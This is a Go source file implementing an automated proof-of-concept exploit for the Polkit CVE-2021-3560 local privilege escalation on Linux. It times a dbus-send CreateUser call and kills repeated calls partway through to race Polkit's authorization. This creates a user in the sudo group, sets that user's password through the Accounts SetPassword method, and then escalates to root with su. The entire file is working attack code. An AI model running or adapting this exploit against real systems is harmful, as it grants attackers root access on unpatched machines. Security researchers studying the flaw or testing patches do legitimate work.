// Copyright (c) 2021 Petruknisme
//
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

var (
	newUser       *string
	password      *string
	fullname      *string
	ExecutionTime int
)

func ExecuteCommand(cmd string) string {

	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %s", cmd)
	}
	//fmt.Printf(string(out))
	return string(out)
}

func main() {

	currUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	currentUsername := currUser.Username
	fmt.Printf("[===] Auto Exploitation PoC for Polkit CVE-2021-3560 by Petruknisme [===]\n")
	fmt.Printf("[+] Current User: %s\n", currentUsername)

	newUser = flag.String("u", "", "User to be created for Privesc")
	password = flag.String("p", "", "Password for new user")
	fullname = flag.String("f", "", "Full name for the user, use \"\" if the name has space")
	flag.Parse()

	if len(*newUser) == 0 && len(*password) == 0 && len(*fullname) == 0 {
		fmt.Println("Usage: ./polkit-auto-exploit -u <username> -p <password> -f <fullname user>")
		flag.PrintDefaults()
		os.Exit(1)
	} else if len(*newUser) == 0 {
		fmt.Println("Usage: ./polkit-auto-exploit -u <username>")
		flag.PrintDefaults()
		os.Exit(1)
	} else if len(*password) == 0 {
		fmt.Println("Usage: ./polkit-auto-exploit -p <password>")
		flag.PrintDefaults()
		os.Exit(1)
	} else if len(*fullname) == 0 {
		fmt.Println("Usage: ./polkit-auto-exploit -f <fullname with \"\" if the name has space>")
		flag.PrintDefaults()
		os.Exit(1)
	}

	fmt.Println("[+] Variable for Polkit Configuration")
	fmt.Printf("[*] Username : %s\n", *newUser)
	fmt.Printf("[*] Password : %s\n", *password)
	fmt.Printf("[*] Fullname : %s\n", *fullname)
	fmt.Println("[+] Sending create user command to determine time execution")

	timeCommand := fmt.Sprintf("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:%s string:%s int32:1", *newUser, *fullname)

	start := time.Now()
	ExecuteCommand(timeCommand)
	elapsed := time.Since(start).Seconds()

	fmt.Printf("[*] Execution time: %fms\n", elapsed)
	kill_time := elapsed / 2
	kill_time_str := fmt.Sprintf("%f", kill_time)
	fmt.Printf("[+] Time to killing dbus-send setting to %sms\n", kill_time_str)

	exp_command := fmt.Sprintf("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:%s string:'%s' int32:1 & sleep %ss ; kill $!", *newUser, *fullname, kill_time_str)
	fmt.Println(exp_command)
	for {

		ExecuteCommand(exp_command)
		fmt.Print(".")
		uid_check := ExecuteCommand("id " + *newUser)
		if strings.Contains(uid_check, "sudo") {
			fmt.Printf("\n[+] GOTCHAAA! User %s is created with sudo member group\n", *newUser)
			break
		}
	}

	usr, err := user.Lookup(*newUser)
	fmt.Printf("[+] Getting UID from user: %s\n", usr.Uid)
	fmt.Println("[+] Creating password with OpenSSL")
	opensslCommand := fmt.Sprintf("openssl passwd -5 %s", *password)
	opensslPassword := ExecuteCommand(opensslCommand)

	passwd_clean := strings.TrimSuffix(opensslPassword, "\n")
	fmt.Println(passwd_clean)
	fmt.Printf("[+] Triggering polkit to create password for %s\n", *newUser)
	pass_command := fmt.Sprintf("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User%s org.freedesktop.Accounts.User.SetPassword string:'%s' string:%s & sleep %ss ; kill $!", usr.Uid, passwd_clean, *fullname, kill_time_str)

	fmt.Println(pass_command)
	for {
		ExecuteCommand(pass_command)
		sucheck_command := fmt.Sprintf("echo %s | su -c id %s", *password, *newUser)
		user_check := ExecuteCommand(sucheck_command)
		fmt.Println(user_check)
		if strings.Contains(user_check, *newUser) && !strings.Contains(user_check, "Failed to execute command") {
			fmt.Printf("[+] GOTCHAAA! Success login with User %s & password: %s\n", *newUser, *password)
			fmt.Printf("[+] You can login to root using su with user and password created before: su -c 'sudo su' %s\n", *newUser)
			privesc_command := fmt.Sprintf("echo %s | su -c 'sudo su' %s", *password, *newUser)
			ExecuteCommand(privesc_command)
			break
		}
	}

}
